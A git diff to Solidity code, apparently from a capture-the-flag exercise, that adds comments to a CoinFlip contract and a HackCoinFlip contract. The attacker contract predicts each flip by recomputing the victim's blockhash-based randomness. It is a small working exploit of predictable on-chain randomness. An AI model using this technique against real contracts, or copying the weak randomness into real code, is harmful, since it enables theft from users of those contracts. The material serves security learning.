@@ -22,7 +22,7 @@ contract CoinFlip {
     uint256 coinFlip = blockValue / FACTOR;
     bool side = coinFlip == 1 ? true : false;
 
-    if (side == _guess) {
+    if (side == _guess) { // this is the main condition for consecutiveWins++
       consecutiveWins++;
       return true;
     } else {
@@ -38,7 +38,7 @@ contract HackCoinFlip {
     constructor (address _target) {
         target = CoinFlip(_target);
     }
-
+   // it has the same code as flip function in the CoinFlip contract
     function _guess() private view returns(bool) {
         uint256 blockValue = uint256(blockhash(block.number-1));
         uint256 coinFlip = blockValue / FACTOR;
@@ -47,7 +47,8 @@ contract HackCoinFlip {
     }
 
     function flip() external {
-        bool guess = _guess();
-        require(target.flip(guess), "Guess Failed");
+        bool side = _guess();
+        // side from _guess will always be equal to the side from flip
+        require(target.flip(side), "Guess Failed");
     }
 }
